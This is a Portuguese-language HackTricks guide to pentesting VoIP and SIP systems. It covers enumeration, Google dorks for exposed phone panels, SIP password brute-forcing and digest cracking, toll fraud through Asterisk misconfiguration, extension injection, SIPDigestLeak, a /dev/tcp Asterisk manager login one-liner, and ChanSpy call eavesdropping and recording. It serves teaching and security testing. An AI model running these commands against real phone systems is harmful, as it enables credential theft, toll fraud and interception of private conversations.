# Pentesting VoIP

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Informa√ß√µes B√°sicas sobre VoIP

Para come√ßar a aprender sobre como o VoIP funciona, confira:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Mensagens B√°sicas
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## C√≥digos de Resposta

**1xx‚ÄîRespostas Provis√≥rias**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîRespostas Bem-Sucedidas**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîRespostas de Redirecionamento**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîRespostas de Falha do Cliente**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîRespostas de Falha do Servidor**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîRespostas de Falha Global**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### N√∫meros de Telefone

Um dos primeiros passos que uma Red Team pode dar √© procurar n√∫meros de telefone dispon√≠veis para contatar a empresa usando ferramentas de OSINT, buscas no Google ou raspagem de p√°ginas da web.

Uma vez que voc√™ tenha os n√∫meros de telefone, voc√™ pode usar servi√ßos online para identificar o operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber se o operador fornece servi√ßos de VoIP pode ajudar a identificar se a empresa est√° usando VoIP... Al√©m disso, √© poss√≠vel que a empresa n√£o tenha contratado servi√ßos de VoIP, mas esteja usando cart√µes PSTN para conectar seu pr√≥prio PBX VoIP √† rede de telefonia tradicional.

Coisas como respostas autom√°ticas de m√∫sica geralmente indicam que o VoIP est√° sendo usado.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informa√ß√µes OSINT

Qualquer outra enumera√ß√£o OSINT que ajude a identificar o software VoIP em uso ser√° √∫til para uma Red Team.

### Enumera√ß√£o de Rede

* **`nmap`** √© capaz de escanear servi√ßos UDP, mas devido ao n√∫mero de servi√ßos UDP sendo escaneados, √© muito lento e pode n√£o ser muito preciso com esse tipo de servi√ßo.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** do SIPVicious (`sudo apt install sipvicious`): Localizar√° servi√ßos SIP na rede indicada.
* `svmap` √© **f√°cil de bloquear** porque usa o User-Agent `friendly-scanner`, mas voc√™ pode modificar o c√≥digo de `/usr/share/sipvicious/sipvicious` e alter√°-lo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS scan √© um scanner muito r√°pido para servi√ßos SIP sobre UDP, TCP ou TLS. Ele utiliza multithreading e pode escanear grandes faixas de redes. Permite indicar facilmente um intervalo de portas, escanear tanto TCP quanto UDP, usar outro m√©todo (por padr√£o, usar√° OPTIONS) e especificar um User-Agent diferente (e mais).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

O PBX tamb√©m pode estar expondo outros servi√ßos de rede, como:

* **69/UDP (TFTP)**: Atualiza√ß√µes de firmware
* **80 (HTTP) / 443 (HTTPS)**: Para gerenciar o dispositivo pela web
* **389 (LDAP)**: Alternativa para armazenar as informa√ß√µes dos usu√°rios
* **3306 (MySQL)**: Banco de dados MySQL
* **5038 (Manager)**: Permite usar Asterisk de outras plataformas
* **5222 (XMPP)**: Mensagens usando Jabber
* **5432 (PostgreSQL)**: Banco de dados PostgreSQL
* E outros...

### Methods Enumeration

√â poss√≠vel encontrar **quais m√©todos est√£o dispon√≠veis** para usar no PBX usando `SIPPTS enumerate` do [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analisando as respostas do servidor

√â muito importante analisar os cabe√ßalhos que um servidor nos envia, dependendo do tipo de mensagem e cabe√ßalhos que enviamos. Com `SIPPTS send` do [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensagens personalizadas, manipulando todos os cabe√ßalhos, e analisar a resposta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Tamb√©m √© poss√≠vel obter dados se o servidor usar websockets. Com `SIPPTS wssend` do [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensagens WS personalizadas.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumera√ß√£o de Extens√µes

Extens√µes em um sistema PBX (Private Branch Exchange) referem-se aos **identificadores internos √∫nicos atribu√≠dos a linhas** telef√¥nicas, dispositivos ou usu√°rios individuais dentro de uma organiza√ß√£o ou empresa. As extens√µes possibilitam **rotear chamadas dentro da organiza√ß√£o de forma eficiente**, sem a necessidade de n√∫meros de telefone externos individuais para cada usu√°rio ou dispositivo.

* **`svwar`** do SIPVicious (`sudo apt install sipvicious`): `svwar` √© um scanner de linha de extens√£o SIP PBX gratuito. Em conceito, funciona de forma semelhante aos discadores tradicionais, **adivinhando uma faixa de extens√µes ou uma lista espec√≠fica de extens√µes**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica extens√µes em um servidor SIP. Sipexten pode verificar grandes redes e intervalos de portas.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Voc√™ tamb√©m pode enumerar extens√µes/nomes de usu√°rio com metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** √© um **enumerador de for√ßa bruta de nome de usu√°rio** do protocolo Inter Asterisk Exchange. O enumIAX pode operar em dois modos distintos: Adivinha√ß√£o Sequencial de Nome de Usu√°rio ou Ataque de Dicion√°rio.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### For√ßa Bruta de Senha - online

Tendo descoberto o **PBX** e alguns **n√∫meros de ramal/nome de usu√°rio**, uma equipe vermelha poderia tentar **autenticar via o m√©todo `REGISTER`** em um ramal usando um dicion√°rio de senhas comuns para realizar a for√ßa bruta na autentica√ß√£o.

{% hint style="danger" %}
Observe que um **nome de usu√°rio** pode ser o mesmo que o ramal, mas essa pr√°tica pode variar dependendo do sistema PBX, sua configura√ß√£o e as prefer√™ncias da organiza√ß√£o...

Se o nome de usu√°rio n√£o for o mesmo que o ramal, voc√™ precisar√° **descobrir o nome de usu√°rio para realizar a for√ßa bruta**.
{% endhint %}

* **`svcrack`** do SIPVicious (`sudo apt install sipvicious`): SVCrack permite que voc√™ quebre a senha para um nome de usu√°rio/ramal espec√≠fico em um PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack √© um cracker de senha remoto para servi√ßos SIP. Rcrack pode testar senhas para v√°rios usu√°rios em diferentes IPs e faixas de portas.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing VoIP

Se voc√™ encontrar equipamentos VoIP dentro de uma **rede Wifi aberta**, voc√™ pode **capturar todas as informa√ß√µes**. Al√©m disso, se voc√™ estiver dentro de uma rede mais fechada (conectada via Ethernet ou Wifi protegido), voc√™ pode realizar **ataques MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre o **PBX e o gateway** para capturar as informa√ß√µes.

Entre as informa√ß√µes da rede, voc√™ pode encontrar **credenciais da web** para gerenciar o equipamento, **ramais** de usu√°rio, **nome de usu√°rio**, endere√ßos **IP**, at√© mesmo **senhas hash** e **pacotes RTP** que voc√™ pode reproduzir para **ouvir a conversa**, e mais.

Para obter essas informa√ß√µes, voc√™ pode usar ferramentas como Wireshark, tcpdump... mas uma **ferramenta especialmente criada para capturar conversas VoIP √©** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Observe que se **TLS for usado na comunica√ß√£o SIP** voc√™ n√£o poder√° ver a comunica√ß√£o SIP em claro.\
O mesmo acontecer√° se **SRTP** e **ZRTP** forem usados, **os pacotes RTP n√£o estar√£o em texto claro**.
{% endhint %}

#### Credenciais SIP (Brute-Force de Senha - offline)

[Verifique este exemplo para entender melhor uma **comunica√ß√£o SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender como as **credenciais est√£o sendo enviadas**.

* **`sipdump`** & **`sipcrack`,** parte do **sipcrack** (`apt-get install sipcrack`): Essas ferramentas podem **extrair** de um **pcap** as **autentica√ß√µes digest** dentro do protocolo SIP e **realizar brute-force** nelas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS dump pode extrair autentica√ß√µes digest de um arquivo pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack √© uma ferramenta para quebrar as autentica√ß√µes digest obtidas com o dump do SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrai dados do protocolo SIP de um arquivo PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### C√≥digos DTMF

**N√£o apenas credenciais SIP** podem ser encontradas no tr√°fego da rede, tamb√©m √© poss√≠vel encontrar c√≥digos DTMF que s√£o usados, por exemplo, para acessar a **caixa de correio de voz**.\
√â poss√≠vel enviar esses c√≥digos em **mensagens SIP INFO**, em **√°udio** ou dentro de **pacotes RTP**. Se os c√≥digos estiverem dentro de pacotes RTP, voc√™ pode cortar essa parte da conversa e usar a ferramenta multimo para extra√≠-los:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chamadas Gratuitas / Configura√ß√µes Incorretas de Conex√µes Asterisks

No Asterisk, √© poss√≠vel permitir uma conex√£o **de um endere√ßo IP espec√≠fico** ou de **qualquer endere√ßo IP**:
```
host=10.10.10.10
host=dynamic
```
Se um endere√ßo IP for especificado, o host **n√£o precisar√° enviar solicita√ß√µes REGISTER** de vez em quando (no pacote REGISTER √© enviado o tempo de vida, geralmente 30min, o que significa que em outro cen√°rio o telefone precisar√° se REGISTRAR a cada 30min). No entanto, ele precisar√° ter portas abertas permitindo conex√µes do servidor VoIP para receber chamadas.

Para definir usu√°rios, eles podem ser definidos como:

* **`type=user`**: O usu√°rio pode apenas receber chamadas como usu√°rio.
* **`type=friend`**: √â poss√≠vel realizar chamadas como par e receb√™-las como usu√°rio (usado com extens√µes)
* **`type=peer`**: √â poss√≠vel enviar e receber chamadas como par (SIP-trunks)

Tamb√©m √© poss√≠vel estabelecer confian√ßa com a vari√°vel insegura:

* **`insecure=port`**: Permite conex√µes de pares validadas por IP.
* **`insecure=invite`**: N√£o requer autentica√ß√£o para mensagens INVITE
* **`insecure=port,invite`**: Ambos

{% hint style="warning" %}
Quando **`type=friend`** √© usado, o **valor** da vari√°vel **host** **n√£o ser√° usado**, ent√£o se um administrador **configurar incorretamente um SIP-trunk** usando esse valor, **qualquer um poder√° se conectar a ele**.

Por exemplo, esta configura√ß√£o seria vulner√°vel:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Chamadas Gratuitas / Configura√ß√µes Incorretas de Contexto do Asterisk

No Asterisk, um **contexto** √© um cont√™iner ou se√ß√£o nomeada no plano de discagem que **agrupa extens√µes, a√ß√µes e regras relacionadas**. O plano de discagem √© o componente central de um sistema Asterisk, pois define **como as chamadas recebidas e enviadas s√£o tratadas e roteadas**. Os contextos s√£o usados para organizar o plano de discagem, gerenciar controle de acesso e fornecer separa√ß√£o entre diferentes partes do sistema.

Cada contexto √© definido no arquivo de configura√ß√£o, tipicamente no arquivo **`extensions.conf`**. Os contextos s√£o denotados por colchetes, com o nome do contexto encerrado dentro deles. Por exemplo:
```bash
csharpCopy code[my_context]
```
Dentro do contexto, voc√™ define extens√µes (padr√µes de n√∫meros discados) e as associa a uma s√©rie de a√ß√µes ou aplicativos. Essas a√ß√µes determinam como a chamada √© processada. Por exemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este exemplo demonstra um contexto simples chamado "my\_context" com uma extens√£o "100". Quando algu√©m disca 100, a chamada ser√° atendida, uma mensagem de boas-vindas ser√° reproduzida e, em seguida, a chamada ser√° encerrada.

Este √© **outro contexto** que permite **ligar para qualquer outro n√∫mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se o administrador definir o **contexto padr√£o** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Qualquer pessoa poder√° usar o **servidor para ligar para qualquer outro n√∫mero** (e o administrador do servidor pagar√° pela chamada).
{% endhint %}

{% hint style="danger" %}
Al√©m disso, por padr√£o, o arquivo **`sip.conf`** cont√©m **`allowguest=true`**, ent√£o **qualquer** atacante sem **autentica√ß√£o** poder√° ligar para qualquer outro n√∫mero.
{% endhint %}

*   **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** O convite SIPPTS verifica se um **servidor PBX nos permite fazer chamadas sem autentica√ß√£o**. Se o servidor SIP tiver uma configura√ß√£o incorreta, ele nos permitir√° fazer chamadas para n√∫meros externos. Tamb√©m pode nos permitir transferir a chamada para um segundo n√∫mero externo.

Por exemplo, se o seu servidor Asterisk tiver uma configura√ß√£o de contexto ruim, voc√™ pode aceitar solicita√ß√µes INVITE sem autoriza√ß√£o. Nesse caso, um atacante pode fazer chamadas sem conhecer nenhum usu√°rio/senha.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Chamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Resposta de Voz Interativa**, uma tecnologia de telefonia que permite que os usu√°rios interajam com um sistema computadorizado por meio de entradas de voz ou toques. O IVRS √© usado para construir sistemas de **manipula√ß√£o automatizada de chamadas** que oferecem uma variedade de funcionalidades, como fornecer informa√ß√µes, direcionar chamadas e capturar entradas do usu√°rio.

O IVRS em sistemas VoIP geralmente consiste em:

1. **Mensagens de voz**: Mensagens de √°udio pr√©-gravadas que orientam os usu√°rios atrav√©s das op√ß√µes e instru√ß√µes do menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) sinaliza√ß√£o: Entradas de toque geradas ao pressionar teclas no telefone, que s√£o usadas para navegar pelos menus IVR e fornecer entradas.
3. **Roteamento de chamadas**: Direcionar chamadas para o destino apropriado, como departamentos espec√≠ficos, agentes ou ramais com base na entrada do usu√°rio.
4. **Captura de entrada do usu√°rio**: Coletar informa√ß√µes dos chamadores, como n√∫meros de conta, IDs de caso ou quaisquer outros dados relevantes.
5. **Integra√ß√£o com sistemas externos**: Conectar o sistema IVR a bancos de dados ou outros sistemas de software para acessar ou atualizar informa√ß√µes, realizar a√ß√µes ou acionar eventos.

Em um sistema VoIP Asterisk, voc√™ pode criar um IVR usando o plano de discagem (**`extensions.conf`** arquivo) e v√°rios aplicativos como `Background()`, `Playback()`, `Read()`, e mais. Esses aplicativos ajudam voc√™ a reproduzir mensagens de voz, capturar entradas do usu√°rio e controlar o fluxo da chamada.

#### Exemplo de configura√ß√£o vulner√°vel
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
O anterior √© um exemplo onde o usu√°rio √© solicitado a **pressionar 1 para chamar** um departamento, **2 para chamar** outro, ou **o n√∫mero completo** se ele souber.\
A vulnerabilidade √© o fato de que o **comprimento da extens√£o indicada n√£o √© verificado, ent√£o um usu√°rio poderia inserir o n√∫mero completo com o tempo limite de 5 segundos e ele ser√° chamado.**

### Inje√ß√£o de Extens√£o

Usando uma extens√£o como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Onde **`${EXTEN}`** √© a **extens√£o** que ser√° chamada, quando **a ext 101 for introduzida** isso √© o que aconteceria:
```scss
exten => 101,1,Dial(SIP/101)
```
No entanto, se **`${EXTEN}`** permitir a introdu√ß√£o de **mais do que n√∫meros** (como nas vers√µes mais antigas do Asterisk), um atacante poderia introduzir **`101&SIP123123123`** para chamar o n√∫mero de telefone 123123123. E este seria o resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Portanto, uma chamada para a extens√£o **`101`** e **`123123123`** ser√° enviada e apenas a primeira que receber a chamada ser√° estabelecida... mas se um atacante usar uma **extens√£o que ignora qualquer correspond√™ncia** que est√° sendo realizada, mas n√£o existe, ele poderia **injetar uma chamada apenas para o n√∫mero desejado**.

## Vulnerabilidade SIPDigestLeak

A vulnerabilidade SIP Digest Leak afeta um grande n√∫mero de telefones SIP, incluindo tanto telefones IP de hardware quanto de software, bem como adaptadores de telefone (VoIP para anal√≥gico). A vulnerabilidade permite **vazamento da resposta de autentica√ß√£o Digest**, que √© calculada a partir da senha. Um **ataque de senha offline √© ent√£o poss√≠vel** e pode recuperar a maioria das senhas com base na resposta ao desafio.

**[Cen√°rio de vulnerabilidade a partir daqui**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Um telefone IP (v√≠tima) est√° ouvindo em qualquer porta (por exemplo: 5060), aceitando chamadas telef√¥nicas
2. O atacante envia um INVITE para o telefone IP
3. O telefone da v√≠tima come√ßa a tocar e algu√©m atende e desliga (porque ningu√©m atende o telefone do outro lado)
4. Quando o telefone √© desligado, o **telefone da v√≠tima envia um BYE para o atacante**
5. O **atacante emite uma resposta 407** que **pede autentica√ß√£o** e emite um desafio de autentica√ß√£o
6. O **telefone da v√≠tima fornece uma resposta ao desafio de autentica√ß√£o** em um segundo BYE
7. O **atacante pode ent√£o realizar um ataque de for√ßa bruta** na resposta ao desafio em sua m√°quina local (ou rede distribu√≠da etc) e adivinhar a senha

* **Vazamento SIPPTS** de [**sippts**](https://github.com/Pepelux/sippts)**:** O vazamento SIPPTS explora a vulnerabilidade SIP Digest Leak que afeta um grande n√∫mero de telefones SIP. A sa√≠da pode ser salva no formato SipCrack para ser for√ßada usando SIPPTS dcrack ou a ferramenta SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite que um **usu√°rio da web** (que, por exemplo, pode estar interessado em um produto) **introduza** seu **n√∫mero de telefone** para ser chamado. Em seguida, um comercial ser√° chamado, e quando ele **atender o telefone**, o usu√°rio ser√° **chamado e conectado com o agente**.

Um perfil comum do Asterisk para isso √©:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* O perfil anterior est√° permitindo **QUALQUER endere√ßo IP se conectar** (se a senha for conhecida).
* Para **organizar uma chamada**, como especificado anteriormente, **nenhuma permiss√£o de leitura √© necess√°ria** e **apenas** **origem** em **escrita** √© necess√°ria.

Com essas permiss√µes, qualquer IP que conhe√ßa a senha poderia se conectar e extrair informa√ß√µes demais, como:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Mais informa√ß√µes ou a√ß√µes podem ser solicitadas.**

### **Escuta**

No Asterisk, √© poss√≠vel usar o comando **`ChanSpy`** indicando a(s) **extens√£o(√µes) a serem monitoradas** (ou todas elas) para ouvir as conversas que est√£o acontecendo. Este comando precisa ser atribu√≠do a uma extens√£o.

Por exemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que se voc√™ **ligar** para a **extens√£o 333**, ele ir√° **monitorar** **`todas`** as extens√µes, **come√ßar a ouvir** sempre que uma nova conversa come√ßar (**`b`**) em modo silencioso (**`q`**) pois n√£o queremos interagir. Voc√™ pode alternar de uma conversa para outra pressionando **`*`**, ou marcando o n√∫mero da extens√£o.

Tamb√©m √© poss√≠vel usar **`ExtenSpy`** para monitorar apenas uma extens√£o.

Em vez de ouvir as conversas, √© poss√≠vel **grav√°-las em arquivos** usando uma extens√£o como: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

As chamadas ser√£o salvas em **`/tmp`**.

Voc√™ tamb√©m pode fazer com que o Asterisk **execute um script que ir√° vazar a chamada** quando for encerrada.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilidade RTCPBleed

**RTCPBleed** √© um problema de seguran√ßa importante que afeta servidores VoIP baseados em Asterisk (publicado em 2017). A vulnerabilidade permite que o **tr√°fego RTP (Real Time Protocol)**, que transporta conversas VoIP, seja **interceptado e redirecionado por qualquer pessoa na Internet**. Isso ocorre porque o tr√°fego RTP contorna a autentica√ß√£o ao navegar atrav√©s de firewalls NAT (Network Address Translation).

Proxies RTP tentam resolver as **limita√ß√µes do NAT** que afetam sistemas RTC, fazendo proxy de fluxos RTP entre duas ou mais partes. Quando o NAT est√° em vigor, o software do proxy RTP muitas vezes n√£o pode confiar nas informa√ß√µes de IP e porta RTP obtidas atrav√©s da sinaliza√ß√£o (por exemplo, SIP). Portanto, v√°rios proxies RTP implementaram um mecanismo onde tal **tupla de IP e porta √© aprendida automaticamente**. Isso √© frequentemente feito inspecionando o tr√°fego RTP de entrada e marcando o IP e a porta de origem para qualquer tr√°fego RTP de entrada como aquele que deve ser respondido. Esse mecanismo, que pode ser chamado de "modo de aprendizado", **n√£o faz uso de qualquer tipo de autentica√ß√£o**. Portanto, **atacantes** podem **enviar tr√°fego RTP para o proxy RTP** e receber o tr√°fego RTP proxy que deveria ser destinado ao chamador ou atendente de um fluxo RTP em andamento. Chamamos essa vulnerabilidade de RTP Bleed porque permite que atacantes recebam fluxos de m√≠dia RTP destinados a usu√°rios leg√≠timos.

Outro comportamento interessante dos proxies RTP e pilhas RTP √© que, √†s vezes, **mesmo que n√£o sejam vulner√°veis ao RTP Bleed**, eles **aceitar√£o, encaminhar√£o e/ou processar√£o pacotes RTP de qualquer fonte**. Portanto, atacantes podem enviar pacotes RTP que podem permitir que eles injetem sua m√≠dia em vez da leg√≠tima. Chamamos esse ataque de inje√ß√£o RTP porque permite a inje√ß√£o de pacotes RTP ileg√≠timos em fluxos RTP existentes. Essa vulnerabilidade pode ser encontrada tanto em proxies RTP quanto em endpoints.

Asterisk e FreePBX tradicionalmente usaram a **configura√ß√£o `NAT=yes`**, que permite que o tr√°fego RTP contorne a autentica√ß√£o, potencialmente levando a nenhuma √°udio ou √°udio unidirecional em chamadas.

Para mais informa√ß√µes, consulte [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detecta a vulnerabilidade RTP Bleed enviando fluxos RTP.
